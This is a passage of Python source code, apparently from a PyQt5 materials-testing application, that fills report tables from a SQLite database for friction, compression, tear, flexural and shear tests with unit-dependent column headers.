E_BREAK_LOAD),printf(\\\"%.2f\\\", PREC_E_AT_BREAK),printf(\\\"%.2f\\\", TENSILE_STRENGTH),printf(\\\"%.2f\\\", def_yeild_strg),printf(\\\"%.2f\\\", MODULUS_100),printf(\\\"%.2f\\\", MODULUS_200),printf(\\\"%.2f\\\", MODULUS_300),printf(\\\"%.2f\\\", MOD_AT_ANY) FROM REPORT_PART_2 A, (SELECT MIN(REC_ID) AS MIN_REC_ID, REPORT_ID FROM REPORT_PART_2 WHERE REPORT_ID IN (SELECT NEW_REPORT_ID FROM GLOBAL_VAR) ) B WHERE A.REPORT_ID=B.REPORT_ID \")           \n            \n        for row_number, row_data in enumerate(results):                        \n            self.tableWidget.insertRow(row_number)\n            for column_number, data in enumerate(row_data):\n                self.tableWidget.setItem(row_number,column_number,QTableWidgetItem(str(data)))\n                \n        for row_number, row_data in enumerate(results1):                    \n            self.tableWidget.insertRow(row_number)\n            for column_number, data in enumerate(row_data):                \n                self.tableWidget.setItem(row_number,column_number,QTableWidgetItem(str(data)))\n                \n                                        \n        #self.tableWidget.resizeColumnsToContents()\n        #self.tableWidget.resizeRowsToContents()\n        self.tableWidget.setEditTriggers(QtWidgets.QTableWidget.NoEditTriggers)     \n        connection.close()\n    def select_all_rows_cof(self):\n        self.delete_all_records()    \n        self.tableWidget.setMidLineWidth(-4)\n        self.tableWidget.setGridStyle(QtCore.Qt.SolidLine)\n        self.tableWidget.setObjectName(\"tableWidget\")\n        self.tableWidget.setColumnCount(6)\n        font = QtGui.QFont()\n        font.setPointSize(10)\n        self.tableWidget.setFont(font)\n        self.tableWidget.horizontalHeader().setStyleSheet(\"QHeaderView { font-size:  10pt};\")\n        self.tableWidget.verticalHeader().setStyleSheet(\"QHeaderView { font-size:  10pt};\")\n        \n        self.tableWidget.setEditTriggers(QtWidgets.QTableWidget.NoEditTriggers)\n        self.tableWidget.setColumnCount(6)\n        self.tableWidget.horizontalHeader().setStretchLastSection(True)\n        self.tableWidget.setHorizontalHeaderLabels(['No.','MAX FORCE(init)  \\n (gm)','AVG FORCE \\n (mm)','STATIC COF',' KINETIC COF ','SLEDGE MASS \\n (gm)'])        \n        self.tableWidget.setColumnWidth(0, 170)\n        self.tableWidget.setColumnWidth(1, 150)\n        self.tableWidget.setColumnWidth(2, 150)\n        self.tableWidget.setColumnWidth(3, 150)\n        self.tableWidget.setColumnWidth(4, 150)\n        self.tableWidget.setColumnWidth(5, 150)\n        \n        connection = sqlite3.connect(\"tyr.db\")\n        #results1=connection.execute(\"SELECT TYPE_STR,printf(\\\"%.4f\\\", CS_AREA),printf(\\\"%.2f\\\", PEAK_LOAD),printf(\\\"%.2f\\\", E_PAEK_LOAD),printf(\\\"%.2f\\\", COMPRESSIVE_STRENGTH),printf(\\\"%.2f\\\", PREC_E_AT_BREAK) FROM REPORT_II_AGGR WHERE REPORT_ID IN (SELECT NEW_REPORT_ID FROM GLOBAL_VAR)\") \n        results1=connection.execute(\"SELECT 'Min',printf(\\\"%.2f\\\", Min(MAX_FORCE)) ,printf(\\\"%.2f\\\", Min(AVG_FORCE)),printf(\\\"%.2f\\\", Min(STATIC_COF)),printf(\\\"%.2f\\\", Min(KINETIC_COF)), printf(\\\"%.2f\\\", Min(SLEDE_WT_GM)) FROM CYCLES_MST WHERE TEST_ID IN (SELECT NEW_REPORT_TEST_ID FROM GLOBAL_VAR) order by cycle_id Asc\")\n        \n        for row_number, row_data in enumerate(results1):                    \n            self.tableWidget.insertRow(row_number)\n            for column_number, data in enumerate(row_data):                \n                self.tableWidget.setItem(row_number,column_number,QTableWidgetItem(str(data)))                \n        connection.close()\n        \n        \n        \n        connection = sqlite3.connect(\"tyr.db\")\n        #results1=connection.execute(\"SELECT TYPE_STR,printf(\\\"%.4f\\\", CS_AREA),printf(\\\"%.2f\\\", PEAK_LOAD),printf(\\\"%.2f\\\", E_PAEK_LOAD),printf(\\\"%.2f\\\", COMPRESSIVE_STRENGTH),printf(\\\"%.2f\\\", PREC_E_AT_BREAK) FROM REPORT_II_AGGR WHERE REPORT_ID IN (SELECT NEW_REPORT_ID FROM GLOBAL_VAR)\") \n        results1=connection.execute(\"SELECT 'Max',printf(\\\"%.2f\\\", max(MAX_FORCE)) ,printf(\\\"%.2f\\\", max(AVG_FORCE)),printf(\\\"%.2f\\\", max(STATIC_COF)),printf(\\\"%.2f\\\", max(KINETIC_COF)),  printf(\\\"%.2f\\\", max(SLEDE_WT_GM)) FROM CYCLES_MST WHERE TEST_ID IN (SELECT NEW_REPORT_TEST_ID FROM GLOBAL_VAR) order by cycle_id Asc\")\n        \n        for row_number, row_data in enumerate(results1):                    \n            self.tableWidget.insertRow(row_number)\n            for column_number, data in enumerate(row_data):                \n                self.tableWidget.setItem(row_number,column_number,QTableWidgetItem(str(data)))                \n        connection.close()\n        \n        connection = sqlite3.connect(\"tyr.db\")\n        #results1=connection.execute(\"SELECT TYPE_STR,printf(\\\"%.4f\\\", CS_AREA),printf(\\\"%.2f\\\", PEAK_LOAD),printf(\\\"%.2f\\\", E_PAEK_LOAD),printf(\\\"%.2f\\\", COMPRESSIVE_STRENGTH),printf(\\\"%.2f\\\", PREC_E_AT_BREAK) FROM REPORT_II_AGGR WHERE REPORT_ID IN (SELECT NEW_REPORT_ID FROM GLOBAL_VAR)\") \n        results1=connection.execute(\"SELECT 'Avg',printf(\\\"%.2f\\\", avg(MAX_FORCE)) ,printf(\\\"%.2f\\\", avg(AVG_FORCE)),printf(\\\"%.2f\\\", avg(STATIC_COF)),printf(\\\"%.2f\\\", avg(KINETIC_COF)),  printf(\\\"%.2f\\\", avg(SLEDE_WT_GM)) FROM CYCLES_MST WHERE TEST_ID IN (SELECT NEW_REPORT_TEST_ID FROM GLOBAL_VAR) order by cycle_id Asc\")\n        \n        for row_number, row_data in enumerate(results1):                    \n            self.tableWidget.insertRow(row_number)\n            for column_number, data in enumerate(row_data):                \n                self.tableWidget.setItem(row_number,column_number,QTableWidgetItem(str(data)))                \n        connection.close()\n        \n        connection = sqlite3.connect(\"tyr.db\")\n        #results1=connection.execute(\"SELECT TYPE_STR,printf(\\\"%.4f\\\", CS_AREA),printf(\\\"%.2f\\\", PEAK_LOAD),printf(\\\"%.2f\\\", E_PAEK_LOAD),printf(\\\"%.2f\\\", COMPRESSIVE_STRENGTH),printf(\\\"%.2f\\\", PREC_E_AT_BREAK) FROM REPORT_II_AGGR WHERE REPORT_ID IN (SELECT NEW_REPORT_ID FROM GLOBAL_VAR)\") \n        results1=connection.execute(\"SELECT ((A.CYCLE_ID)-C.MIN_CYCLE_ID)+1 AS SPECIMEN_NO,printf(\\\"%.2f\\\", A.MAX_FORCE) ,printf(\\\"%.2f\\\", A.AVG_FORCE),printf(\\\"%.2f\\\", A.STATIC_COF),printf(\\\"%.2f\\\", A.KINETIC_COF), printf(\\\"%.2f\\\", A.SLEDE_WT_GM) FROM CYCLES_MST A , (SELECT min(CYCLE_ID) as MIN_CYCLE_ID,TEST_ID FROM CYCLES_MST WHERE TEST_ID in (SELECT NEW_REPORT_TEST_ID FROM GLOBAL_VAR)) C WHERE A.TEST_ID=C.TEST_ID AND A.TEST_ID IN (SELECT NEW_REPORT_TEST_ID FROM GLOBAL_VAR) order by cycle_id Asc\")\n        \n        for row_number, row_data in enumerate(results1):                    \n            self.tableWidget.insertRow(row_number)\n            for column_number, data in enumerate(row_data):                \n                self.tableWidget.setItem(row_number,column_number,QTableWidgetItem(str(data)))                \n        connection.close()\n       \n        \n        self.tableWidget.setEditTriggers(QtWidgets.QTableWidget.NoEditTriggers)\n    \n    \n    \n    \n    \n    def select_all_rows_compress(self):\n        self.delete_all_records()    \n        self.tableWidget.setMidLineWidth(-4)\n        self.tableWidget.setGridStyle(QtCore.Qt.SolidLine)\n        self.tableWidget.setObjectName(\"tableWidget\")\n        self.tableWidget.setColumnCount(6)\n        font = QtGui.QFont()\n        font.setPointSize(10)\n        self.tableWidget.setFont(font)\n        self.tableWidget.horizontalHeader().setStyleSheet(\"QHeaderView { font-size:  10pt};\")\n        self.tableWidget.verticalHeader().setStyleSheet(\"QHeaderView { font-size:  10pt};\")\n        \n        self.tableWidget.setEditTriggers(QtWidgets.QTableWidget.NoEditTriggers)\n        self.tableWidget.horizontalHeader().setStretchLastSection(True)\n        self.tableWidget.setColumnWidth(0, 100)\n        self.tableWidget.setColumnWidth(1, 100)\n        self.tableWidget.setColumnWidth(2, 100)\n        self.tableWidget.setColumnWidth(3, 180)\n        self.tableWidget.setColumnWidth(4, 280)\n        self.tableWidget.setColumnWidth(5, 50)\n        \n        connection = sqlite3.connect(\"tyr.db\")\n        results=connection.execute(\"SELECT STG_GRAPH_TYPE,STG_UNIT_TYPE FROM GLOBAL_REPORTS_PARAM\") \n        for x in results:           \n            self.unit_typex=x[1]\n        connection.close()\n        \n        self.tableWidget.horizontalHeader().setStretchLastSection(True)\n           \n        if(self.unit_typex == \"Kg/Cm\"):\n            self.tableWidget.setHorizontalHeaderLabels(['Spec. \\n No', 'CS Area \\n (cm2)', 'Force at Peak\\n (Kgf)', 'Compression \\n (cm)', 'Compressive Strength \\n (Kgf/Cm2)','% Compression \\n'])\n        elif(self.unit_typex == \"Lb/Inch\"):\n            self.tableWidget.setHorizontalHeaderLabels(['Spec. \\n No', 'CS Area \\n (Inch2)', 'Force at Peak\\n (Lb)', 'Compression \\n (Inch)', 'Compressive Strength \\n (Lb/Inch2)','% Compression \\n'])           \n        elif(self.unit_typex == \"Newton/Mm\"):\n            self.tableWidget.setHorizontalHeaderLabels(['Spec. \\n No', 'CS Area \\n (mm2)', 'Force at Peak\\n (N)', 'Compression \\n (mm)', 'Compressive Strength \\n (N/mm2)','% Compression \\n'])            \n        elif(self.unit_typex == \"MPA\"):\n            self.tableWidget.setHorizontalHeaderLabels(['Spec. \\n No', 'CS Area \\n (mm2)', 'Force at Peak\\n (N)', 'Compression \\n (mm)', 'Compressive Strength \\n (MPA)','% Compression \\n'])           \n        else:\n            self.tableWidget.setHorizontalHeaderLabels(['Spec. \\n No', 'CS Area \\n (mm2)', 'Force at Peak\\n (MPA)', 'Compression \\n (mm)', 'Compressive Strength \\n (MPA)','% Compression \\n'])\n          \n        \n       \n        connection = sqlite3.connect(\"tyr.db\")\n        results1=connection.execute(\"SELECT TYPE_STR,printf(\\\"%.4f\\\", CS_AREA),printf(\\\"%.2f\\\", PEAK_LOAD),printf(\\\"%.2f\\\", E_PAEK_LOAD),printf(\\\"%.2f\\\", COMPRESSIVE_STRENGTH),printf(\\\"%.2f\\\", PREC_E_AT_BREAK) FROM REPORT_II_AGGR WHERE REPORT_ID IN (SELECT NEW_REPORT_ID FROM GLOBAL_VAR)\") \n            \n        #results=connection.execute(\"SELECT ((A.REC_ID)-B.MIN_REC_ID)+1 AS SPECIMEN_NO,A.THICKNESS,A.WIDTH,A.CS_AREA,A.PEAK_LOAD,A.E_PAEK_LOAD,A.PERCENTG_E_PEAK_LOAD_MM,A.PERCENTG_E_PEAK_LOAD FROM REPORT_MST_II A, (SELECT MIN(REC_ID) AS MIN_REC_ID, REPORT_ID FROM REPORT_MST_II WHERE REPORT_ID IN (SELECT NEW_REPORT_ID FROM GLOBAL_VAR) ) B WHERE A.REPORT_ID=B.REPORT_ID \")                        \n        for row_number, row_data in enumerate(results1):                    \n            self.tableWidget.insertRow(row_number)\n            for column_number, data in enumerate(row_data):                \n                self.tableWidget.setItem(row_number,column_number,QTableWidgetItem(str(data)))\n                \n        connection.close()                                    \n        #self.tableWidget.resizeColumnsToContents()\n        #self.tableWidget.resizeRowsToContents()\n        \n        \n        connection = sqlite3.connect(\"tyr.db\")\n        results=connection.execute(\"SELECT ((A.REC_ID)-B.MIN_REC_ID)+1 AS SPECIMEN_NO,printf(\\\"%.4f\\\", A.CS_AREA),printf(\\\"%.2f\\\", A.PEAK_LOAD),printf(\\\"%.2f\\\", A.E_PAEK_LOAD),printf(\\\"%.2f\\\", A.COMPRESSIVE_STRENGTH),printf(\\\"%.2f\\\", A.PREC_E_AT_BREAK) FROM REPORT_MST_II A, (SELECT MIN(REC_ID) AS MIN_REC_ID, REPORT_ID FROM REPORT_MST_II WHERE REPORT_ID IN (SELECT NEW_REPORT_ID FROM GLOBAL_VAR) ) B WHERE A.REPORT_ID=B.REPORT_ID\") \n        for row_number, row_data in enumerate(results):                    \n            self.tableWidget.insertRow(row_number)\n            for column_number, data in enumerate(row_data):\n                self.tableWidget.setItem(row_number,column_number,QTableWidgetItem(str(data)))\n        \n        connection.close()\n        \n        \n        self.tableWidget.setEditTriggers(QtWidgets.QTableWidget.NoEditTriggers)     \n    \n    def select_all_rows_tear(self):\n        self.delete_all_records()    \n        self.tableWidget.setMidLineWidth(-4)\n        self.tableWidget.setGridStyle(QtCore.Qt.SolidLine)\n        self.tableWidget.setObjectName(\"tableWidget\")\n        self.tableWidget.setColumnCount(4)\n        font = QtGui.QFont()\n        font.setPointSize(10)\n        self.tableWidget.setFont(font)\n        self.tableWidget.horizontalHeader().setStyleSheet(\"QHeaderView { font-size:  10pt};\")\n        self.tableWidget.verticalHeader().setStyleSheet(\"QHeaderView { font-size:  10pt};\")\n        \n        self.tableWidget.setEditTriggers(QtWidgets.QTableWidget.NoEditTriggers)\n        self.tableWidget.horizontalHeader().setStretchLastSection(True)\n        self.tableWidget.setColumnWidth(0, 100)\n        self.tableWidget.setColumnWidth(1, 100)\n        self.tableWidget.setColumnWidth(2, 100)\n        self.tableWidget.setColumnWidth(3, 120)\n        \n        connection = sqlite3.connect(\"tyr.db\")\n        results=connection.execute(\"SELECT STG_GRAPH_TYPE,STG_UNIT_TYPE FROM GLOBAL_REPORTS_PARAM\") \n        for x in results:           \n            self.unit_typex=x[1]\n        connection.close()\n        \n        self.tableWidget.horizontalHeader().setStretchLastSection(True)\n           \n        if(self.unit_typex == \"Kg/Cm\"):\n            self.tableWidget.setHorizontalHeaderLabels(['Spec. \\n No', 'Thickness \\n (cm)', 'Force at Peak\\n (Kgf)', 'Tear Strength \\n (Kgf/Cm)'])\n        elif(self.unit_typex == \"Lb/Inch\"):\n            self.tableWidget.setHorizontalHeaderLabels(['Spec. \\n No', 'Thickness \\n (Inch)', 'Force at Peak\\n (Lb)', 'Tear Strength \\n (Lb/Inch)'])           \n        elif(self.unit_typex == \"Newton/Mm\"):\n            self.tableWidget.setHorizontalHeaderLabels(['Spec. \\n No', 'Thickness\\n (mm)', 'Force at Peak\\n (N)', 'Tear Strength \\n (N/mm)'])            \n        elif(self.unit_typex == \"MPA\"):\n            self.tableWidget.setHorizontalHeaderLabels(['Spec. \\n No', 'Thickness\\n (mm)', 'Force at Peak\\n (N)', 'Tear Strength \\n (MPA)'])           \n        else:\n            self.tableWidget.setHorizontalHeaderLabels(['Spec. \\n No', 'Thickness \\n (mm)', 'Force at Peak\\n (MPA)', 'Tear Strength \\n (MPA)'])\n          \n        \n       \n        connection = sqlite3.connect(\"tyr.db\")\n        results1=connection.execute(\"SELECT TYPE_STR,printf(\\\"%.2f\\\", THICKNESS),printf(\\\"%.2f\\\", PEAK_LOAD),printf(\\\"%.2f\\\", E_PAEK_LOAD),printf(\\\"%.2f\\\", TEAR_STRENGTH)  FROM REPORT_II_AGGR WHERE REPORT_ID IN (SELECT NEW_REPORT_ID FROM GLOBAL_VAR)\") \n            \n        #results=connection.execute(\"SELECT ((A.REC_ID)-B.MIN_REC_ID)+1 AS SPECIMEN_NO,A.THICKNESS,A.WIDTH,A.CS_AREA,A.PEAK_LOAD,A.E_PAEK_LOAD,A.PERCENTG_E_PEAK_LOAD_MM,A.PERCENTG_E_PEAK_LOAD FROM REPORT_MST_II A, (SELECT MIN(REC_ID) AS MIN_REC_ID, REPORT_ID FROM REPORT_MST_II WHERE REPORT_ID IN (SELECT NEW_REPORT_ID FROM GLOBAL_VAR) ) B WHERE A.REPORT_ID=B.REPORT_ID \")                        \n        for row_number, row_data in enumerate(results1):                    \n            self.tableWidget.insertRow(row_number)\n            for column_number, data in enumerate(row_data):                \n                self.tableWidget.setItem(row_number,column_number,QTableWidgetItem(str(data)))\n                \n        connection.close()                                    \n        #self.tableWidget.resizeColumnsToContents()\n        #self.tableWidget.resizeRowsToContents()\n        \n        \n        connection = sqlite3.connect(\"tyr.db\")\n        results=connection.execute(\"SELECT ((A.REC_ID)-B.MIN_REC_ID)+1 AS SPECIMEN_NO,printf(\\\"%.2f\\\", A.THICKNESS),printf(\\\"%.2f\\\", A.PEAK_LOAD),printf(\\\"%.2f\\\", A.E_PAEK_LOAD),printf(\\\"%.2f\\\", A.TEAR_STRENGTH)  FROM REPORT_MST_II A, (SELECT MIN(REC_ID) AS MIN_REC_ID, REPORT_ID FROM REPORT_MST_II WHERE REPORT_ID IN (SELECT NEW_REPORT_ID FROM GLOBAL_VAR) ) B WHERE A.REPORT_ID=B.REPORT_ID\") \n        for row_number, row_data in enumerate(results):                    \n            self.tableWidget.insertRow(row_number)\n            for column_number, data in enumerate(row_data):\n                self.tableWidget.setItem(row_number,column_number,QTableWidgetItem(str(data)))\n        \n        connection.close()\n        \n        \n        self.tableWidget.setEditTriggers(QtWidgets.QTableWidget.NoEditTriggers)  \n   \n   \n    def select_all_rows_flexural(self):\n        self.length=0\n        self.delete_all_records()    \n        self.tableWidget.setMidLineWidth(-4)\n        self.tableWidget.setGridStyle(QtCore.Qt.SolidLine)\n        self.tableWidget.setObjectName(\"tableWidget\")\n        self.tableWidget.setColumnCount(16)\n        font = QtGui.QFont()\n        font.setPointSize(10)\n        self.tableWidget.setFont(font)\n        self.tableWidget.horizontalHeader().setStyleSheet(\"QHeaderView { font-size:  10pt};\")\n        self.tableWidget.verticalHeader().setStyleSheet(\"QHeaderView { font-size:  10pt};\")\n        \n        self.tableWidget.setEditTriggers(QtWidgets.QTableWidget.NoEditTriggers)\n        self.tableWidget.horizontalHeader().setStretchLastSection(True)\n        self.tableWidget.setColumnWidth(0, 100)\n        self.tableWidget.setColumnWidth(1, 120)\n        self.tableWidget.setColumnWidth(2, 120)\n        self.tableWidget.setColumnWidth(3, 120)\n        self.tableWidget.setColumnWidth(4, 180)\n        self.tableWidget.setColumnWidth(5, 180)\n        self.tableWidget.setColumnWidth(6, 150)\n        self.tableWidget.setColumnWidth(7, 180)\n        self.tableWidget.setColumnWidth(8, 150)\n        self.tableWidget.setColumnWidth(9, 150)\n        self.tableWidget.setColumnWidth(10, 180)\n        self.tableWidget.setColumnWidth(11, 150)\n        self.tableWidget.setColumnWidth(12, 180)\n        self.tableWidget.setColumnWidth(13, 150)\n        self.tableWidget.setColumnWidth(14, 150)\n        self.tableWidget.setColumnWidth(15, 150)\n        \n        connection = sqlite3.connect(\"tyr.db\")\n        results=connection.execute(\"SELECT STG_GRAPH_TYPE,STG_UNIT_TYPE FROM GLOBAL_REPORTS_PARAM\") \n        for x in results:           \n            self.unit_typex=x[1]\n        connection.close()\n        \n        connection = sqlite3.connect(\"tyr.db\")\n        results=connection.execute(\"SELECT IFNULL(GUAGE_MM,0) FROM REPORT_MST WHERE REPORT_ID IN (SELECT NEW_REPORT_ID FROM GLOBAL_VAR)\")                        \n        for x in results:\n            self.length=str(x[0])\n        connection.close()    \n         \n        \n        self.tableWidget.horizontalHeader().setStretchLastSection(True)\n           \n        if(self.unit_typex == \"Kg/Cm\"):\n            self.length=float(int(self.length)*0.1)\n            self.tableWidget.setHorizontalHeaderLabels(['Spec. \\n No','Length  \\n (cm)','Thickness  \\n (cm)','Width  \\n (cm)','Support \\n Span  \\n (cm)', 'Max. \\n Displ. \\n (cm)', 'Force \\n at Peak \\n (Kgf)', 'Flexural \\n Strength \\n (Kgf/cm2) ','Flexural \\n Modulus \\n ','Flexural \\n Strain \\n % (Break)','Flexural \\n Strain \\n % (Input)',' Support Radious (cm) ',' Load Radious (cm) ','Speed (mm/min)','Failure \\n Mode','Test \\n Method'])\n        elif(self.unit_typex == \"Lb/Inch\"):\n            self.length=float(int(self.length)*0.0393701)\n            self.tableWidget.setHorizontalHeaderLabels(['Spec. \\n No','Length  \\n (Inch)','Thickness  \\n (Inch)','Width  \\n (Inch)','Support \\n Span  \\n (Inch)', 'Max. \\n Displ. \\n (Inch)', 'Force \\n  at Peak\\n (Lb)', 'Flexural \\n  Strength \\n (Lb/Inch2)  ','Flexural \\n Modulus \\n ','Flexural \\n Strain \\n % (Break)','Flexural \\n Strain \\n % (Input)',' Support Radious (Inch) ',' Load Radious (Inch) ','Speed (mm/min)','Failure \\n Mode','Test \\n Method'])           \n        elif(self.unit_typex == \"Newton/Mm\"):\n            self.tableWidget.setHorizontalHeaderLabels(['Spec. \\n No','Length  \\n (mm)','Thickness  \\n (mm)','Width  \\n (mm)','Support \\n Span  \\n (mm)', 'Max. \\n Displ. \\n (mm)', 'Force \\n  at Peak\\n (N)', 'Flexural \\n  Strength \\n (N/mm2)','Flexural \\n Modulus \\n ','Flexural \\n Strain \\n % (Break)','Flexural \\n Strain \\n % (Input)',' Support Radious (mm) ',' Load Radious (mm) ','Speed (mm/min)','Failure \\n Mode','Test \\n Method'])            \n        elif(self.unit_typex == \"MPA\"):\n            self.tableWidget.setHorizontalHeaderLabels(['Spec. \\n No','Length  \\n (mm)','Thickness  \\n (mm)','Width  \\n (mm)','Support \\n Span  \\n (mm)', 'Max. \\n Displ. \\n (mm)', 'Force \\n  at Peak\\n (N)', 'Flexural \\n  Strength \\n (MPa)','Flexural \\n Modulus \\n ','Flexural \\n Strain \\n % (Break)','Flexural \\n Strain \\n % (Input)',' Support Radious (mm) ',' Load Radious (mm) ','Speed (mm/min)','Failure \\n Mode','Test \\n Method'])           \n        else:\n            self.tableWidget.setHorizontalHeaderLabels(['Spec. \\n No','Length  \\n (mm)', 'Thickness  \\n (mm)','Width  \\n (mm)','Support \\n Span  \\n (mm)','Max. \\n Displ. \\n (mm)', 'Force \\n  at Peak\\n (Kgf)', 'Flexural\\n   Strength \\n (MPa)','Flexural \\n Modulus \\n ','Flexural \\n Strain \\n % (Break)','Flexural \\n Strain \\n % (Input)',' Support Radious (mm) ',' Load Radious (mm) ','Speed (mm/min)','Failure \\n Mode','Test \\n Method'])\n          \n        \n       \n        connection = sqlite3.connect(\"tyr.db\")\n        results1=connection.execute(\"SELECT TYPE_STR,990,printf(\\\"%.2f\\\", THICKNESS),printf(\\\"%.2f\\\", WIDTH),printf(\\\"%.2f\\\", SPAN),printf(\\\"%.2f\\\", E_PAEK_LOAD),printf(\\\"%.2f\\\", PEAK_LOAD),printf(\\\"%.2f\\\", FLEXURAL_STRENGTH),printf(\\\"%.2f\\\", flexural_mod_kg_cm),printf(\\\"%.2f\\\", per_strain_at_break),printf(\\\"%.2f\\\", per_strain_at_input),printf(\\\"%.2f\\\", support_radious),printf(\\\"%.2f\\\", load_radious),printf(\\\"%.2f\\\", speed_rpm) FROM REPORT_II_AGGR WHERE REPORT_ID IN (SELECT NEW_REPORT_ID FROM GLOBAL_VAR)\") \n            \n        #results=connection.execute(\"SELECT ((A.REC_ID)-B.MIN_REC_ID)+1 AS SPECIMEN_NO,A.THICKNESS,A.WIDTH,A.CS_AREA,A.PEAK_LOAD,A.E_PAEK_LOAD,A.PERCENTG_E_PEAK_LOAD_MM,A.PERCENTG_E_PEAK_LOAD FROM REPORT_MST_II A, (SELECT MIN(REC_ID) AS MIN_REC_ID, REPORT_ID FROM REPORT_MST_II WHERE REPORT_ID IN (SELECT NEW_REPORT_ID FROM GLOBAL_VAR) ) B WHERE A.REPORT_ID=B.REPORT_ID \")                        \n        for row_number, row_data in enumerate(results1):                    \n            self.tableWidget.insertRow(row_number)\n            for column_number, data in enumerate(row_data):                \n                self.tableWidget.setItem(row_number,column_number,QTableWidgetItem(str(data)))\n                \n        connection.close()                                    \n        #self.tableWidget.resizeColumnsToContents()\n        #self.tableWidget.resizeRowsToContents()\n        \n        \n        connection = sqlite3.connect(\"tyr.db\")\n        results=connection.execute(\"SELECT ((A.REC_ID)-B.MIN_REC_ID)+1 AS SPECIMEN_NO,\"+str(self.length)+\",printf(\\\"%.2f\\\", A.THICKNESS),printf(\\\"%.2f\\\", A.WIDTH),printf(\\\"%.2f\\\", A.SPAN),printf(\\\"%.2f\\\", A.E_PAEK_LOAD),printf(\\\"%.2f\\\", A.PEAK_LOAD),printf(\\\"%.2f\\\", A.FLEXURAL_STRENGTH),printf(\\\"%.2f\\\", A.FLEXURAL_MOD_KG_CM),printf(\\\"%.2f\\\", A.PER_STRAIN_AT_BREAK),printf(\\\"%.2f\\\", A.PER_STRAIN_AT_INPUT),printf(\\\"%.2f\\\", A.SUPPORT_RADIOUS),printf(\\\"%.2f\\\", A.LOAD_RADIOUS),printf(\\\"%.2f\\\", A.SPEED_RPM),A.BREAK_MODE,A.TEST_METHOD    FROM REPORT_MST_II A, (SELECT MIN(REC_ID) AS MIN_REC_ID, REPORT_ID FROM REPORT_MST_II WHERE REPORT_ID IN (SELECT NEW_REPORT_ID FROM GLOBAL_VAR) ) B WHERE A.REPORT_ID=B.REPORT_ID\") \n        for row_number, row_data in enumerate(results):                    \n            self.tableWidget.insertRow(row_number)\n            for column_number, data in enumerate(row_data):\n                self.tableWidget.setItem(row_number,column_number,QTableWidgetItem(str(data)))\n        \n        connection.close()\n        \n        \n        self.tableWidget.setEditTriggers(QtWidgets.QTableWidget.NoEditTriggers)  \n   \n    def select_all_rows_qlss(self):\n        self.delete_all_records()    \n        self.tableWidget.setMidLineWidth(-4)\n        self.tableWidget.setGridStyle(QtCore.Qt.SolidLine)\n        self.tableWidget.setObjectName(\"tableWidget\")\n        self.tableWidget.setColumnCount(11)\n        font = QtGui.QFont()\n        font.setPointSize(10)\n        self.tableWidget.setFont(font)\n        self.tableWidget.horizontalHeader().setStyleSheet(\"QHeaderView { font-size:  10pt};\")\n        self.tableWidget.verticalHeader().setStyleSheet(\"QHeaderView { font-size:  10pt};\")\n        \n        self.tableWidget.setEditTriggers(QtWidgets.QTableWidget.NoEditTriggers)\n        self.tableWidget.horizontalHeader().setStretchLastSection(True)\n        self.tableWidget.setColumnWidth(0, 80)\n        self.tableWidget.setColumnWidth(1, 80)\n        self.tableWidget.setColumnWidth(2, 80)\n        self.tableWidget.setColumnWidth(3, 80)\n        self.tableWidget.setColumnWidth(4, 80)\n        self.tableWidget.setColumnWidth(5, 80)\n        self.tableWidget.setColumnWidth(6, 100)\n        self.tableWidget.setColumnWidth(7, 100)\n        self.tableWidget.setColumnWidth(8, 250)\n        self.tableWidget.setColumnWidth(9, 150)\n        \n        connection = sqlite3.connect(\"tyr.db\")\n        results=connection.execute(\"SELECT STG_GRAPH_TYPE,STG_UNIT_TYPE FROM GLOBAL_REPORTS_PARAM\") \n        for x in results:           \n            self.unit_typex=x[1]           \n        connection.close()\n        \n        \n        \n        connection = sqlite3.connect(\"tyr.db\")\n        results=connection.execute(\"SELECT MOD_AT_ANY FROM REPORT_MST WHERE REPORT_ID IN (SELECT NEW_REPORT_ID FROM GLOBAL_VAR)\")                        \n        for x in results:            \n                self.shear_mod_ip=str(x[0]) \n        connection.close()    \n         \n        if(self.shear_mod_ip == \"\"):\n            self.shear_mod_ip=100\n        else:\n            pass\n            \n        self.tableWidget.horizontalHeader().setStretchLastSection(True)\n           \n        if(self.unit_typex == \"Kg/Cm\"):\n            self.tableWidget.setHorizontalHeaderLabels(['Spec. \\n No','Width \\n (Cm)','Thickness \\n (Cm)','CS Area \\n (Cm2)','Max. Force \\n (Kgf)',' Max. \\n Disp.(Cm) ','Ult. Shear\\n Strength \\n (Kgf/Cm2)','Ult. Shear \\n Strain %','Shear Strain \\n @ Ult. Shear Stress','Shear Modulus \\n @ Ult. Shear Stress \\n (Kg/Cm2)','Shear Modulus \\n @ '+str(self.shear_mod_ip)+'\\n (Kg/Cm2) Shear Stress'])        \n        elif(self.unit_typex == \"Lb/Inch\"):\n            self.tableWidget.setHorizontalHeaderLabels(['Spec. \\n No','Width \\n (Inch)','Thickness \\n (Inch)','CS Area \\n (Inch2)','Max. Force \\n (Lb)',' Max. \\n Disp.(Inch) ','Ult. Shear\\n Strength \\n (Lb\\Inch2)','Ult. Shear \\n Strain %','Shear Strain \\n @ Ult. Shear Stress','Shear Modulus \\n @ Ult. Shear Stress \\n (Lb/Inch2)','Shear Modulus \\n @ '+str(self.shear_mod_ip)+'\\n (Lb/Inch2) Shear Stress'])        \n        elif(self.unit_typex == \"Newton/Mm\"):\n            self.tableWidget.setHorizontalHeaderLabels(['Spec. \\n No','Width \\n (Mm)','Thickness \\n (Mm)','CS Area \\n (Mm2)','Max. Force \\n (N)',' Max. \\n Disp.(Mm) ','Ult. Shear\\n Strength \\n (N/Mm2)','Ult. Shear \\n Strain %','Shear Strain \\n @ Ult. Shear Stress','Shear Modulus \\n @ Ult. Shear Stress \\n (N/Mm2)','Shear Modulus \\n @ '+str(self.shear_mod_ip)+' \\n (N/Mm2) Shear Stress'])        \n        elif(self.unit_typex == \"MPA\"):\n            self.tableWidget.setHorizontalHeaderLabels(['Spec. \\n No','Width \\n (Mm)','Thickness \\n (Mm)','CS Area \\n (Mm2)','Max. Force \\n (N)',' Max. \\n Disp.(Mm) ','Ult. Shear\\n Strength \\n (MPA)','Ult. Shear \\n Strain %','Shear Strain \\n @ Ult. Shear Stress','Shear Modulus \\n @ Ult. Shear Stress','Shear Modulus \\n @ '+str(self.shear_mod_ip)+' Shear Stress'])        \n        else:\n            self.tableWidget.setHorizontalHeaderLabels(['Spec. \\n No','Width \\n (Mm)','Thickness \\n (Mm)','CS Area \\n (Mm2)','Max. Force \\n (Kgf)',' Max. \\n Disp.(Mm) ','Ult. Shear\\n Strength','Ult. Shear \\n Strain %','Shear Strain \\n @ Ult. Shear Stress','Shear Modulus \\n @ Ult. Shear Stress','Shear Modulus \\n @ 